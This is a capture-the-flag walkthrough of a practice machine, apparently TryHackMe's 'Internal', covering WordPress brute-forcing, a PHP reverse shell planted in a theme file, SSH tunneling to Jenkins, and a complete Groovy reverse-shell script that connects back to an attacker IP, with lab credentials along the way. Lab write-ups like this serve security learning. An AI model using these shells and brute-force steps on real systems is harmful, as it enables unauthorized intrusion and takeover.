So lets deploy the machine and start enumerating.

![[Pasted image 20241116163637.png]]

We can see ssh open on port 22 and a http web server on port 80. If we enter on 10.10.199.61 we see Apache2 Ubuntu Default Page.

![[Pasted image 20241116163644.png]]

After some directory enumeration, we find the following:

/blog

/phpmyadmin

/javascript

/wordpress/wp-login.php

![[Pasted image 20241116163655.png]]

It is necessary to add internal.thm to our /etc/hosts file to navigate through the website.

Since we know admin is a user because he has a post on the website, we can brute force the login page using wpscan and rockyou.txt for the password.

![[Pasted image 20241116163705.png]]
So we found admin:my2boys as valid credentials now we can log in.

Now if we go to Appearence we can see some php files, let's create edit them and add our php reverse shell. Later with a nc listener we can get access. [http://internal.thm/blog/wp-content/themes/twentyseventeen/search.php](http://internal.thm/blog/wp-content/themes/twentyseventeen/search.php)

![[Pasted image 20241116163715.png]]

Now just access link of the edited php file and we are in.

Let's upgrade our shell

python -c 'import pty; pty.spawn("/bin/bash")'

Using linpeas we find some interesting information. wordpress:wordpress123 credentials

some phpmyadmin credentials we can check on config file.

![[Pasted image 20241116163724.png]]

phpmyadmin:B2Ud4fEOZmVq

Let's go into phpmyadmin page which we find before with directory enumeration and check what is in.

Nothing interesting.

Enumerating a little bit more trying to locate .txt for flags we find intersting file.

![[Pasted image 20241116163733.png]]

aubreanna:bubb13guM!@#123 Now we can connect through ssh.

Once in we see a txt file with a jenkins server which is not reachable from our machine. We need to do SSH tunneling to forward that server so we are able to reach it from our machine.

![[Pasted image 20241116163743.png]]

Now from port 3333 we can access the server.

![[Pasted image 20241116163752.png]]

Now we use hydra to burteforce admin user on jenkins.

![[Pasted image 20241116163832.png]]

We got credentials!! admin:spongebob

Now on jenkins at /script we can run Goovy scripts and get a reverse shell. String host="10.11.18.85";

int port=6666;

String cmd="/bin/sh";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())

{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while( si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try

{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); With a netcat listener we get access.

So once in the system we use find command to locate files like we did to see if we get something interesting.

/opt/note.txt seems similar to previous one.

We found root credentials on the file!! root:tr0ub13guM!@#123

Now we can ssh as root and get last flag.